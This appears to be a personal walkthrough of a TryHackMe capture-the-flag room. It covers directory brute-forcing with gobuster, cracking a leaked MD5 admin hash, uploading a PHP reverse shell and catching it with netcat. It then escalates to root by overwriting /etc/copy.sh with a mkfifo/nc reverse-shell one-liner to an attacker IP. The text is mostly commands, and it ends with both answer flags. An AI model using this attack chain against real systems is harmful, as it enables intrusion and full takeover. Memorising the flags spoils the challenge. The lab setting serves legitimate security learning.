brute-force the http://ip -
'''			gobuster dir -u http://ip -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.text'''
	
	found /content directory

	then brute-force this /content directory -
'''			gobuster dir -u http://ip/content -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.text '''
	
	found '/inc' directory
	in this directory found - '/mysql_backup' sub-direcotry
	
	open this directory in the browser -
'''				http://ip/content/inc/mysql_backup
	
	download the sql data

	at line 79 -
'''		found admin username - 'manager' & hashed pwd - '42f749ade7f9e195bf475f37a44cafcb'
	this is md5 hash ,,, decrypt it -
'''		pwd is 'Password123'

	when we brute-forced the /content directory there is '/as' directory which has a login form
	enter these credentials and login

getting the shell -
	go to 'ads' section of this page
	there add the 'php reverse shell' code and give it a name' (let's say 'rev_shell')
		edit the ip and port -
			give the ip of the tryhackme vpn ip and give the port of the netcat on which we are listening for the incomming connections

	in the terminal listen for the connections using 'netcat' - 
'''			 nc -lvnp 5559		(enter any port number, here 5559)
	
	now go to the browser and write -

'''		http://ip/content/inc/ads/rev_shell.php
	
	and then we will get the shell in the terminal

getting the user flag -
	change the directory to 'home'
	cat the 'user.txt' and we got the user flag

privilege escalation to get the root shell -
	
	there is a file that we can run using sudo -
'''		/home/itguy/backup.pl

		this script is running another script - '/etc/copy.sh' and this script is running a netcat function for the root shell
			so what we have to do is ,, we have to modify the /etc/copy.sh script to our IP and our choice of port (or changing port is not necessary , we can listen to that port also)
			we can't use any text editors on that remote computer so we  will overwrite the text in the '/etc/copy.sh' using 'echo' command -

'''				echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.118.82 5656 >/tmp/f' (the IP is the ip which we have got through the vpn connectino to TryHackMe) 

			now listen for the connections on the our terminal using netcat -
'''				nc -lvnp 5656

			and then run the shell - 'backup.pl' which will run the '/etc/copy.sh' and we wll get the root shell -
'''				sudo /usr/bin/perl /home/itguy/backup.pl

			and now we have the root shell 

			simply search for root flag


USER FLAG - THM{63e5bce9271952aad1113b6f1ac28a07}
ROOT FLAG - THM{6637f41d0177b6f37cb20d775124699f}
